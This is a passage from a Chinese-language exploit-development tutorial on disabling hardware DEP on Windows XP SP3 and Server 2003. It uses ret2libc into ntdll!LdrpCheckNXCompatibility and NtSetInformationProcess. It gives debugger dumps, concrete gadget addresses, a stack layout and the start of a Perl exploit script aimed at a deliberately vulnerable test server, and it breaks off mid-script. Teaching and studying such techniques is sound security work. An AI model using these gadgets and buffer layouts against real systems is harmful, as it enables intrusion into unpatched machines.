+0x000 Permanent : Pos 3, 1 Bit
+0x000 ExecuteDispatchEnable : Pos 4, 1 Bit
+0x000 ImageDispatchEnable : Pos 5, 1 Bit
+0x000 Spare : Pos 6, 2 Bits
Seh.exe进程的_KPROCESS结构（starts at 0×00400000）：
0:000> dt nt!_KPROCESS 00400000 -r
ntdll!_KPROCESS
+0x000 Header : _DISPATCHER_HEADER
. . .
+0x06b Flags : _KEXECUTE_OPTIONS
+0x000 ExecuteDisable : 0y1
+0x000 ExecuteEnable : 0y0
+0x000 DisableThunkEmulation : 0y0
+0x000 Permanent : 0y0
+0x000 ExecuteDispatchEnable : 0y0
+0x000 ImageDispatchEnable : 0y1
+0x000 Spare : 0y00
当DEP被启用时，ExecuteDisable被置位，当DEP被禁用，ExecuteEnable被置位，当Permanent标志置
位的时候表示这些设置是最终设置，不可以被改变。
David Kennedy最近发表了一篇关于如何在 windows 2003 sp2上绕过DEP保护的文章，在这节中，我会
简单讨论下这种技术。
实质上，这种DEP绕过技术就是调用可以关闭 DEP的系统函数，然后返回到 shellcode,为了顺利达成这
样目的，你需要对栈的布局进行针对性的设计…稍后，你就能弄懂我所说的意思。
要做的第一件事就是调用函数NtSetInformationProcess，调用的时候指定信息类ProcessExecuteFlags
(0×22)和MEM_EXECUTE_OPTION_ENABLE (0×2)标志，DEP就会被关闭。简单的说，这个函数调用就是：
（拷贝自Skape/Skywing的文章）
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
NtSetInformationProcess(
NtCurrentProcess(), // (HANDLE)-1
ProcessExecuteFlags, // 0x22
&ExecuteFlags, // ptr to 0x2
sizeof(ExecuteFlags)); // 0x4
为了初始化这个函数调用，你需要用到一些技术，一个是 ret2libc 技术，该流程将需要重定向到
NtSetInformationProcess函数，为了给它设置正确的参数，需要用正确的值布置堆栈，这种情况下有个
缺点，那就是你需要能在这次缓冲区溢出中使用NULL。
另外一个是利用ntdll中现有的关闭进程DEP的代码，并把控制传回到用户控制的缓冲区，你依然需要布
置堆栈，但却省去了为函数设计参数的麻烦。
请记住这种技术依赖于系统版本，在 Windows XP SP2 ， SP3， Windows 2003 SP1系统上利用会比在
Windows 2003 SP2上简单很多。
关闭DDDDEEEEPPPP((((WWWWiiiinnnnddddoooowwwwssssXXXXPPPP//// WWWWiiiinnnnddddoooowwwwssss2222000000003333SSSSPPPP1111)))):::: 演示
为了在Windows XP上关闭硬件DEP，需要完成下边的步骤：
-eax必须设置为1（好吧，eax的低位必须设置为1），然后函数返回（例如：“mov eax,1 / ret” -“ mov
al,0x1 / ret”-“xor eax,eax / inc eax / ret”等等类似的指令），稍后，你可以看到为什么需要这
样设置。
当跳转到LdrpCheckNXCompatibility，下边的操作会被执行：
(1)设置esi为2。
(2)检查ZF 是否置位（al等于1的情况）。
(3)检查al是否等于1，如果相等，就会实现一个跳转。
(4)一个局部变量被设置成esi的内容（esi等于2,看步骤（1），所以局部变量等于2）。
(5)跳转到另一处代码。
(6)检查局部变量是否为0，它等于2（看步骤4），所以它跳转到另一处代码。
(7)把信息类设置为ProcessExecuteFlags，并把信息参数指针设置成前边初始化为 2的那个变量的地址
（看步骤（1）和（4）），然后调用NtSetInformationProcess.这个进程的NX就被关闭了。
(8)到这里，一个典型函数结尾被执行（恢复保存的寄存器，执行leave/ret指令）。
为了完成这个任务，我们需要找到三个地址，并把它们准确的放到堆栈的对应位置。
-设置eax为1，然后返回，你需要用这个地址去覆盖返回地址。
-当eax设置成1，然后执行返回时，ntdll!LdrpCheckNXCompatibility中指令cmp al,0x1的地址应该正
好在栈顶（它会成为新的EIP），注意上一步的指令“ret”，如果是带偏移的ret，你需要抵消这个偏移
对栈的影响，这样程序流程就会到达关闭NX的函数，接着看看这个函数返回到哪里。
-当关闭NX的函数返回时，负责跳转到shellcode（jmp esp,等等）的指令应该正好得到控制权。
此外，因为存在针对ebp-4 地址的写操作（这个变量会作为NtSetInformationProcess的参数来关闭NX），
所以ebp必须指向可写的地址，由于在溢出的时候，ebp也被缓冲区的数据覆盖了，因此在执行关闭 NX
的例程前必须用某种方式让ebp重新指向可写的内存地址（例如栈中的地址），稍后，我们会讨论这种技
术。
为了演示在windows xp上绕过 DEP，我们将使用一个带漏洞的服务程序，它监听 200端口，这个程序存
在缓冲区溢出漏洞，它允许我们直接覆盖返回地址，在windows xp sp3上编译这个代码（不开启/GS和
Safeseh）,并确保DEP已被启用。
为了实现完美的绕过，我们需要完成所有步骤，并需要合理的布置堆栈。
我们可以 在 ntdll 中找到一个把 eax 置 1 的指令，这个指令 后边紧跟着一个返回指令
(NtdllOkayToLockRoutine) :
ntdll!NtdllOkayToLockRoutine:
7c95371a b001 mov al,1
7c95371c c20400 ret 4
注意:我们需要处理四字节的偏移（因为ret+0x4被执行）
也可以找到一些其他的指令：
kernel32.dll :
kernel32!NlsThreadCleanup+0x71:
7c80c1a0 b001 mov al,1
7c80c1a2 c3 ret
rpcrt4.dll :
0:000> u 0x77eda402
RPCRT4!NDR_PIPE_HELPER32::GotoNextParam+0x1b:
77eda402 b001 mov al,1
77eda404 c3 ret
rpcrt4.dll :
0:000> u 0x77eda6ba
RPCRT4!NDR_PIPE_HELPER32::VerifyChunkTailCounter:
77eda6ba b001 mov al,1
77eda6bc c20800 ret 8
注意:ret+0x8!
(稍后，我会解释如何查找这些地址)
好吧，我们有了四个符合第一项要求的地址，这个地址需要被放到堆栈中保存返回地址的地方。
在windows xp sp3(英文)上函数LdrpCheckNXCompatibility是这个样子：
0:000> uf ntdll!LdrpCheckNXCompatibility
ntdll!LdrpCheckNXCompatibility:
7c91cd31 8bff mov edi,edi
7c91cd33 55 push ebp
7c91cd34 8bec mov ebp,esp
7c91cd36 51 push ecx
7c91cd37 8365fc00 and dword ptr [ebp-4],0
7c91cd3b 56 push esi
7c91cd3c ff7508 push dword ptr [ebp+8]
7c91cd3f e887ffffff call ntdll!LdrpCheckSafeDiscDll (7c91cccb)
7c91cd44 3c01 cmp al,1
7c91cd46 6a02 push 2
7c91cd48 5e pop esi
7c91cd49 0f84ef470200 je ntdll!LdrpCheckNXCompatibility+0x1a (7c94153e)
在地址7c91cd44上，步骤（1）和（3）被执行，esi被置2，并将跳到0×7c94153e，这意味我们需要放
到堆栈上的第二个地址是7c91cd44。
在7c91cd49处程序跳转到地址7c94153e，它包含下边的指令：
ntdll!LdrpCheckNXCompatibility+0x1a:
7c94153e 8975fc mov dword ptr [ebp-4],esi
7c941541 e909b8fdff jmp ntdll!LdrpCheckNXCompatibility+0x1d (7c91cd4f)
这就是步骤（4）和（5），esi等于2，ebp-4也被置成2，接着我们跳转到7c91cd4f，下边是它包含的
指令：
0:000> u 7c91cd4f
ntdll!LdrpCheckNXCompatibility+0x1d:
7c91cd4f 837dfc00 cmp dword ptr [ebp-4],0
7c91cd53 0f85089b0100 jne ntdll!LdrpCheckNXCompatibility+0x4d (7c936861)
步骤（6），代码根据ebp-4是否为0，选择执行，我们知道ebp-4等于2，所以这个跳转被执行，我们来
到了7c936861，这里是步骤（7），这个地址的指令如下：
0:000> u 7c936861
ntdll!LdrpCheckNXCompatibility+0x4d:
7c936861 6a04 push 4
7c936863 8d45fc lea eax,[ebp-4]
7c936866 50 push eax
7c936867 6a22 push 22h
7c936869 6aff push 0FFFFFFFFh
7c93686b e82e74fdff call ntdll!ZwSetInformationProcess (7c90dc9e)
7c936870 e91865feff jmp ntdll!LdrpCheckNXCompatibility+0x5c (7c91cd8d)
7c936875 90 nop
在 7c93686b 处， 函 数 ZwSetInformationProcess 被调 用 ， 调 用 指 令 之 前 基 本 都 是 根 据
ProcessExecuteFlags信息类设置参数，其中一个参数是（也就是ebp-4）0x2，这表示当函数完成时，NX
会被关闭，它返回并执行下条指令（在7c936870），这里是函数的结尾：
ntdll!LdrpCheckNXCompatibility+0x5c:
7c91cd8d 5e pop esi
7c91cd8e c9 leave
7c91cd8f c20400 ret 4
在这里，NX被关闭，“ret 4”指令返回调用函数，如果正确的设置了堆栈，栈上的跳板地址将获得控制
权，这个跳板地址可以跳转到shellcode去继续执行。
听起来似乎简单，但是发现这个技术的人很可能不得不去研究很多东西…为此我们应该竖起我们的大拇
指。
我们布置堆栈的条件意味着什么？我们讨论了地址和需要注意的偏移…但是我们怎么去构造字符串来溢
出这个缓冲区呢？
ImmDbg可以帮到我们，ImmDbg 支持的命令!findantidep,可以帮助设置正确的堆栈，或者用我写的命令
pvefindaddr来寻找更多的可用的地址（我注意到!findantidep不一定能获取到正确的地址，所以你可以
使用!findantidep得到栈结构，然后用pvefindaddr来获取正确的地址），
pvefindaddr (ImmDbg pycommand)（下载之前需要登录）
首先，我们使用pvefindaddr来找下需要的两个地址。
接着，用!findantidep来获取结构，这个命令会出现三个对话框，仅需要在第一个对话框中选择一个地
址（任意地址），然后在第二个对话框中填上“jmp esp”(没有引号),然后在第三个对话框中选择任意地
址，注意，我们不用findantidep提供的地址，只用它提供的结构…
打开日志窗口：
stack =
"\xa0\xc1\x80\x7c\xff\xff\xff\xff\x48\x2c\x91\x7c\xff\xff\xff\xff"
+ "A" * 0x54
+ "\x73\x12\xab\x71"
+ shellcode
!findantidep给我们展示了我们需要怎样安排堆栈：
1st addr | offset 1 | 2nd address | offset 2 | 54 bytes | jmp to shellc | shellc
第一个地址是实现设置 eax 为 1 并返回的那两条指令的地址（例如：pvefindaddr 发现的地址
0×7c95371a），在我们的攻击串中，我们需要用这个地址覆盖保存在栈中的返回地址，这个地址上会执
行ret 4，因此在需要在这个地址的后边，添加四字节的数据来抵消其对堆栈的影响（offset 1）。
第二个地址是用于关闭进程 NX的地址，这个地址是0×7c91cd44（用 pvefindaddr找到得），当这个例
程返回时，有一个ret 4被执行（因此我们需要再次添加4字节的填充物）（offset 2）
接着是54字节的填充物，这是为了调整堆栈。当NX被禁用后，它会恢复保存的寄存器，执行leave指令，
这时，ebp指向了距离esp 54字节远的位置，为了应对这种情况，我们需要多添加54字节数据。
在这54字节的后边，我们把跳板地址放在这里，当禁用NX的函数返回的时候，这个位置上的地址会被设
置成EIP而得到执行权,最后，我们把shellcode放在后边。
（很显然这个结构符合攻击时的真实堆栈，如果你可以找到类似jmp/call/push+ret的能跳转到shellcode
的指令，只要把它们放在堆栈上适当的地方，它就可以被执行）。实际上，!findantidep给出的整个结
构只是显示了原理，为了确保构建正确的缓冲区，你需要一步步的跟踪观察寄存器的状态，我们的例子也
将完全按照这样的方式来完成。
让我们看下我们的例子vulnsrv.exe,我们知道我们将在508字节后覆盖返回地址,所以我们在缓冲区的这
个位置放置特定的值来覆盖返回地址，这是关闭NX的第一步。
我们从头开始构建这个攻击串，首先我们把第一个地址放在返回地址对应的位置上：
508 A’s + 0×7c95371a + “BBBB” + “CCCC” + 54 D’s + “EEEE” + 700 F’s
use strict;
use Socket;
my $junk = "A" x 508;
my $disabledep = pack('V',0x7c95371a);
$disabledep = $disabledep."BBBB";
$disabledep = $disabledep."CCCC";
$disabledep = $disabledep.("D" x 54);
$disabledep = $disabledep.("EEEE");
my $shellcode="F" x 700;
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port